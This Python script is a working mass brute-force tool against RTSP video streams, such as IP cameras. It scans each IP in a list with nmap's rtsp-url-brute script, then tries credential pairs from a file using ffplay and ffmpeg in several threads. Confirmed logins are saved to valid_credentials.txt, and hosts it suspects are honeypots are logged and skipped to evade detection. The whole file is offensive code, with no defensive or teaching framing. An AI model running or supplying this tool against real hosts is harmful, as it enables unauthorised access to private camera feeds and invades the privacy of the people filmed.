import os
import subprocess
import threading
import queue
import time
import urllib.parse
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Constants
HONEYPOT_THRESHOLD = 3  # Number of successful logins to consider an IP a honeypot
HONEYPOT_FILE = "honeypots.txt"  # File to store honeypot IPs
DEFAULT_PATHS = ["/"]  # Default paths to test if Nmap finds none

def load_honeypots():
    """Load honeypot IPs from a file."""
    if not os.path.exists(HONEYPOT_FILE):
        return set()
    with open(HONEYPOT_FILE, "r") as f:
        return {line.strip() for line in f if line.strip()}

def save_honeypot(ip):
    """Save a honeypot IP to the file."""
    with open(HONEYPOT_FILE, "a") as f:
        f.write(f"{ip}\n")

def run_nmap(ip):
    """Runs Nmap with the rtsp-url-brute script on the given IP and returns discovered paths."""
    output_file = f"{ip}.txt"
    cmd = ["nmap", "--script", "rtsp-url-brute", "-p", "554", ip]
    paths = set()
    try:
        with open(output_file, "w") as f:
            subprocess.run(cmd, stdout=f, stderr=subprocess.DEVNULL, text=True, check=True)
        logging.info(f"Nmap scan completed for {ip}, results saved in {output_file}")
        # Parse Nmap output for paths
        with open(output_file, "r") as f:
            for line in f:
                if "rtsp://" in line and ip in line:
                    path = urllib.parse.urlparse(line.strip().split("rtsp://")[1]).path
                    paths.add(path if path else "/")
    except subprocess.CalledProcessError as e:
        logging.error(f"Nmap scan failed for {ip}: {e}")
    return list(paths) if paths else DEFAULT_PATHS

def verify_success(ip, username, password, path):
    """Verifies a successful login using ffmpeg, with properly encoded credentials."""
    encoded_username = urllib.parse.quote(username, safe='')
    encoded_password = urllib.parse.quote(password, safe='')

    rtsp_url = f"rtsp://{encoded_username}:{encoded_password}@{ip}:554{path}"
    logging.info(f"Verifying credentials: {rtsp_url}")

    try:
        result = subprocess.run(
            ["ffmpeg", "-rtsp_transport", "tcp", "-i", rtsp_url, "-t", "5", "-f", "null", "-"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5
        )

        if any(err in result.stderr for err in ["Unauthorized", "Invalid data found", "Connection refused", "400 Bad Request"]):
            logging.warning(f"False positive: {rtsp_url} (Verification failed)")
            return False

        logging.info(f"CONFIRMED SUCCESS: {rtsp_url}")
        return True
    except subprocess.TimeoutExpired:
        logging.warning(f"Verification timeout: {rtsp_url}")
    except Exception as e:
        logging.error(f"Error during verification: {e}")

    return False

def attempt_login(ip, username, password, path):
    """Attempts RTSP login and verifies success, properly encoding special characters."""
    encoded_username = urllib.parse.quote(username, safe='')
    encoded_password = urllib.parse.quote(password, safe='')

    rtsp_url = f"rtsp://{encoded_username}:{encoded_password}@{ip}:554{path}"
    logging.info(f"Trying {rtsp_url}")

    try:
        # Adjust ffplay timeout to match subprocess timeout
        result = subprocess.run(
            ["ffplay", "-rtsp_transport", "tcp", "-i", rtsp_url, "-t", "5", "-loglevel", "error", "-autoexit"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5
        )

        if any(err in result.stderr for err in ["401 Unauthorized", "Invalid data found", "Connection refused", "400 Bad Request"]):
            logging.warning(f"Failed: {rtsp_url} (Invalid credentials)")
        else:
            logging.info(f"Possible success: {rtsp_url}")
            return verify_success(ip, username, password, path)

    except subprocess.TimeoutExpired:
        logging.warning(f"Failed: {rtsp_url} (Timeout)")
    except Exception as e:
        logging.error(f"Error during login attempt: {e}")

    return False

def brute_force_worker(ip, path, creds_queue, success_list, lock):
    """Worker function to process the credential queue for a specific path."""
    while not creds_queue.empty():
        username, password = creds_queue.get()
        if attempt_login(ip, username, password, path):
            with lock:
                success_list.append((ip, username, password, path))
        creds_queue.task_done()

def brute_force_rtsp(ip, paths, creds):
    """Attempts RTSP brute-force login using multiple threads for a given IP and paths."""
    success_list = []
    lock = threading.Lock()

    for path in paths:
        creds_queue = queue.Queue()
        for cred in creds:
            username, password = cred.split(":", 1)
            creds_queue.put((username, password))

        threads = []
        num_threads = min(5, len(creds))
        for _ in range(num_threads):
            thread = threading.Thread(target=brute_force_worker, args=(ip, path, creds_queue, success_list, lock))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    return success_list

def worker(ip, creds, success_results, honeypots):
    """Worker function to process an IP."""
    if ip in honeypots:
        logging.info(f"Skipping honeypot IP: {ip}")
        return

    paths = run_nmap(ip)
    success_creds = brute_force_rtsp(ip, paths, creds)
    if success_creds:
        success_results[ip] = success_creds
        if len(success_creds) >= HONEYPOT_THRESHOLD:
            logging.warning(f"Potential honeypot detected: {ip} (multiple successful logins)")
            save_honeypot(ip)
            honeypots.add(ip)

def check_tools():
    """Check if required tools are installed."""
    required_tools = ['nmap', 'ffplay', 'ffmpeg']
    for tool in required_tools:
        try:
            subprocess.run([tool, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except FileNotFoundError:
            logging.error(f"{tool} is not installed. Please install it and try again.")
            return False
    return True

def main(ip_list_file, creds_file):
    if not check_tools():
        return

    if not os.path.exists(ip_list_file):
        logging.error(f"IP list file {ip_list_file} not found!")
        return
    if not os.path.exists(creds_file):
        logging.error(f"Credentials file {creds_file} not found!")
        return

    with open(ip_list_file, "r") as f:
        ips = [line.strip() for line in f if line.strip()]
    with open(creds_file, "r") as f:
        creds = [line.strip() for line in f if ":" in line]

    success_results = {}
    honeypots = load_honeypots()

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(worker, ip, creds, success_results, honeypots): ip for ip in ips}
        for future in as_completed(futures):
            ip = futures[future]
            try:
                future.result()
            except Exception as e:
                logging.error(f"Error processing IP {ip}: {e}")

    # Save all successfully cracked credentials
    with open("valid_credentials.txt", "w") as f:
        for ip, success_creds in success_results.items():
            for cred in success_creds:
                ip_addr, username, password, path = cred
                f.write(f"{ip_addr} {username}:{password} Path: {path}\n")

if __name__ == "__main__":
    ip_list = "ips.txt"  # List of IPs, one per line
    creds_list = "creds.txt"  # List of credentials in user:pass format
    main(ip_list, creds_list)
